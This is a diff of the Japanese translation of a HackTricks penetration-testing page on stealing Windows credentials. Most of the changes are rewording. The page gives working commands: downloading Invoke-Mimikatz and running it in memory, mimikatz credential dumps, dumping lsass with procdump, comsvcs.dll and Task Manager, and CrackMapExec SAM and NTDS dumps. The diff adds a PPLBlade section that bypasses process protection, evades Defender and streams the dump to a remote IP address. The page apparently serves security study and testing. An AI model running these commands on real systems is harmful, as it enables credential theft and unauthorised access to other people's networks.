@@ -30,11 +30,11 @@ mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump
 
 Invoke-Mimikatzは、Mimikatzというツールを実行するためのPowerShellスクリプトです。Mimikatzは、Windowsのセキュリティ機能をバイパスし、認証情報を盗むために使用されるツールです。
 
-このスクリプトを実行すると、Mimikatzがメモリ内の認証情報を抽出し、平文のパスワードやハッシュ値を表示します。これにより、攻撃者はユーザーのパスワードを盗むことができます。
+このスクリプトを実行すると、Mimikatzがメモリ内の認証情報を抽出し、平文のパスワードやハッシュを表示します。これにより、攻撃者はユーザーのパスワードを盗み、不正なアクセスを行うことができます。
 
 Invoke-Mimikatzは、管理者権限を持つユーザーが実行する必要があります。また、Windows Defenderや他のセキュリティソフトウェアによって検出される可能性があるため、注意が必要です。
 
-詳細な手順や使用方法については、[このページ](credentials-mimikatz.md)を参照してください。
+詳細な使用方法やMimikatzの他の機能については、[このページ](credentials-mimikatz.md)を参照してください。
 ```bash
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
@@ -44,7 +44,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 
 ## Meterpreterを使用した資格情報
 
-被害者の中にあるパスワードとハッシュを検索するために、[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **を使用してください。**私が作成したものです。
+被害者の中にあるパスワードとハッシュを検索するために、[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **を使用してください。** これは私が作成したものです。
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -65,7 +65,7 @@ mimikatz_command -f "lsadump::sam"
 
 ### Procdump + Mimikatz
 
-**SysInternalsのProcdump**は[**Microsoftの正規ツール**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)であるため、Defenderに検出されません。\
+**SysInternalsのProcdump**は、**Microsoftの正規ツール**であるため、Defenderに検出されません。\
 このツールを使用して、**lsassプロセスをダンプ**し、**ダンプをダウンロード**して、**ダンプからローカルにクレデンシャルを抽出**することができます。
 
 {% code title="lsassのダンプ" %}
@@ -95,41 +95,43 @@ mimikatz # sekurlsa::logonPasswords
 ```
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
-この技術は**SYSTEM**としてのみ実行できることを念頭に置いておく必要があります。
+この技術は**SYSTEM**としてのみ実行できることを念頭に置かなければなりません。
 
 **[lssasy](https://github.com/Hackndo/lsassy)**を使用して、このプロセスを自動化することができます。
 
-### タスクマネージャを使用してlsassをダンプする
+### タスクマネージャを使用してlsassをダンプする方法
 
 1. タスクバーを右クリックし、タスクマネージャをクリックします。
 2. 「詳細」をクリックします。
-3. プロセスタブで「Local Security Authority Process」プロセスを検索します。
+3. プロセスタブで「Local Security Authority Process」というプロセスを検索します。
 4. 「Local Security Authority Process」プロセスを右クリックし、「ダンプファイルの作成」をクリックします。
 
-### procdumpを使用してlsassをダンプする
+### procdumpを使用してlsassをダンプする方法
 
 [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)は、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/)スイートの一部である、Microsoftによって署名されたバイナリです。
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
+## PPLBladeを使用してlsassをダンプする
+
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade)は、メモリダンプを難読化し、ディスクに保存せずにリモートワークステーションに転送することができるProtected Process Dumperツールです。
+
+**主な機能**：
+
+1. PPL保護のバイパス
+2. Defenderのシグネチャベースの検出メカニズムを回避するためのメモリダンプファイルの難読化
+3. ディスクに保存せずに、RAWおよびSMBのアップロード方法でメモリダンプをアップロードする（ファイルレスダンプ）
+
+{% code overflow="wrap" %}
+```bash
+PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
+```
+{% endcode %}
+
 ## CrackMapExec
 
 ### SAMハッシュのダンプ
-
-CrackMapExecは、Windowsネットワークでの認証情報の収集に使用される強力なツールです。このツールを使用すると、SAMデータベースからユーザーのハッシュをダンプすることができます。
-
-以下のコマンドを使用して、CrackMapExecを使用してSAMハッシュをダンプします。
-
-```
-crackmapexec <target> -u <username> -p <password> --sam
-```
-
-このコマンドでは、`<target>`にはターゲットのIPアドレスまたはホスト名を指定し、`<username>`と`<password>`には有効な認証情報を指定します。`--sam`フラグを使用することで、SAMハッシュのダンプが有効になります。
-
-SAMハッシュは、Windowsのユーザー認証情報を格納するデータベースであるSAM（Security Accounts Manager）から取得されます。これらのハッシュは、パスワードの解析やクラックに使用されることがあります。
-
-CrackMapExecを使用してSAMハッシュをダンプすることで、ネットワーク内の脆弱性を特定し、セキュリティの向上に役立てることができます。ただし、このような活動は合法的なペネトレーションテストの一環として行われるべきであり、許可なく他人の認証情報を収集することは違法です。
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
@@ -137,7 +139,7 @@ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 
 #### 概要
 
-LSA（Local Security Authority）シークレットは、Windowsオペレーティングシステムで使用される重要な認証情報を格納するための機能です。これには、ユーザーのパスワードやネットワーク共有のパスワードなどが含まれます。このテクニックでは、LSAシークレットをダンプして、これらの機密情報を取得します。
+LSA（Local Security Authority）シークレットは、Windowsオペレーティングシステムで使用される重要な認証情報を格納するための機能です。これには、ユーザーのパスワードやネットワーク共有の認証情報などが含まれます。このテクニックでは、LSAシークレットをダンプして、これらの機密情報を取得します。
 
 #### 手順
 
@@ -147,7 +149,7 @@ LSA（Local Security Authority）シークレットは、Windowsオペレーテ�
 
 3. `lsadump::secrets`コマンドを使用して、LSAシークレットをダンプします。
 
-   ```plaintext
+   ```
    mimikatz # lsadump::secrets
    ```
 
@@ -180,7 +182,7 @@ ntdsutil "ac i ntds" "ifm" "create full c:\path\to\dump" q q
 5. ダンプされたNTDS.ditファイルを解析して、ユーザーアカウントの認証情報を取得します。
 ```
 
-注意: この手法は、適切な権限を持つユーザーによって実行される必要があります。また、法的な制約や許可なく他人のシステムにアクセスすることは違法です。
+注意: この手法は、合法的な目的のためにのみ使用してください。権限のないネットワークやシステムへのアクセスは違法です。
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
@@ -197,10 +199,10 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 7. `quit`と入力してEnterキーを押します。
 8. `quit`と再度入力してEnterキーを押します。
 
-これにより、ターゲットDCのNTDS.ditファイルからパスワード履歴がダンプされます。ダンプされたファイルは指定した出力フォルダに保存されます。
+これにより、NTDS.ditファイルとそのパスワード履歴が指定した出力フォルダにダンプされます。
 ```
 
-この手順に従うことで、ターゲットDCからNTDS.ditのパスワード履歴をダンプすることができます。ダンプされたファイルには、ユーザーの以前のパスワードが含まれています。
+この手順に従うことで、ターゲットDCからNTDS.ditのパスワード履歴をダンプすることができます。
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
@@ -212,7 +214,7 @@ To display the pwdLastSet attribute for each NTDS.dit account, you can use the f
 Get-ADUser -Filter * -Properties pwdLastSet | Select-Object Name, pwdLastSet
 ```
 
-This command will retrieve all user accounts from the NTDS.dit database and display their names along with the pwdLastSet attribute.
+This command will retrieve all user accounts from the NTDS.dit database and display their names along with the pwdLastSet attribute value.
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
@@ -300,7 +302,7 @@ Windows Server 2008以降で利用可能です。
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-[**ボリュームシャドウコピー**](./#stealing-sam-and-system)のトリックを使って、**ntds.dit**ファイルをコピーすることもできます。**SYSTEMファイル**のコピーも必要です（再び、レジストリからダンプするか、[**ボリュームシャドウコピー**](./#stealing-sam-and-system)のトリックを使用してください）。
+[**ボリュームシャドウコピー**](./#stealing-sam-and-system)トリックを使用して、**ntds.dit**ファイルをコピーすることもできます。**SYSTEMファイル**のコピーも必要です（再び、レジストリからダンプするか、[**ボリュームシャドウコピー**](./#stealing-sam-and-system)トリックを使用してください）。
 
 ### **NTDS.ditからハッシュを抽出する**
 
@@ -322,7 +324,7 @@ NTDSオブジェクトは、[ntdsdotsqlite](https://github.com/almandin/ntdsdots
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-`SYSTEM`ハイブはオプションですが、シークレットの復号化（NTハッシュ、LMハッシュ、クリアテキストパスワード、Kerberosまたは信頼キー、NTハッシュ、LMハッシュのパスワード履歴などの補足的な資格情報）を許可します。他の情報と共に、以下のデータが抽出されます：ユーザーとマシンのアカウントとそのハッシュ、UACフラグ、最後のログオンとパスワード変更のタイムスタンプ、アカウントの説明、名前、UPN、SPN、グループと再帰的なメンバーシップ、組織単位ツリーとメンバーシップ、信頼されたドメインとその信頼のタイプ、方向、属性...
+`SYSTEM`ハイブはオプションですが、シークレットの復号化（NTハッシュ、LMハッシュ、クリアテキストパスワード、Kerberosまたは信頼キー、NTハッシュ、LMハッシュのパスワード履歴などの補足資格情報）を許可します。他の情報と共に、以下のデータが抽出されます：ユーザーアカウントとマシンアカウントとそれらのハッシュ、UACフラグ、最後のログオンとパスワード変更のタイムスタンプ、アカウントの説明、名前、UPN、SPN、グループと再帰的なメンバーシップ、組織単位ツリーとメンバーシップ、信頼されたドメインとその信頼のタイプ、方向、属性...
 
 ## Lazagne
 
@@ -334,7 +336,7 @@ lazagne.exe all
 
 ### Windows credentials Editor (WCE)
 
-このツールはメモリから資格情報を抽出するために使用できます。以下からダウンロードしてください: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
+このツールはメモリから資格情報を抽出するために使用できます。以下からダウンロードしてください：[http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
 ### fgdump
 
@@ -353,22 +355,20 @@ type outpwdump
 ```
 ### PwDump7
 
-[ここからダウンロード](http://www.tarasco.org/security/pwdump\_7)して、単に**実行**するだけでパスワードが抽出されます。
+[ここからダウンロード](http://www.tarasco.org/security/pwdump\_7)し、単に**実行**するだけでパスワードが抽出されます。
 
 ## 防御策
 
-[**ここでいくつかの資格情報の保護方法を学びましょう。**](credentials-protections.md)
-
-
+[**ここでいくつかの資格情報の保護方法について学びましょう。**](credentials-protections.md)
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
-* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **サイバーセキュリティ企業で働いていますか？** HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
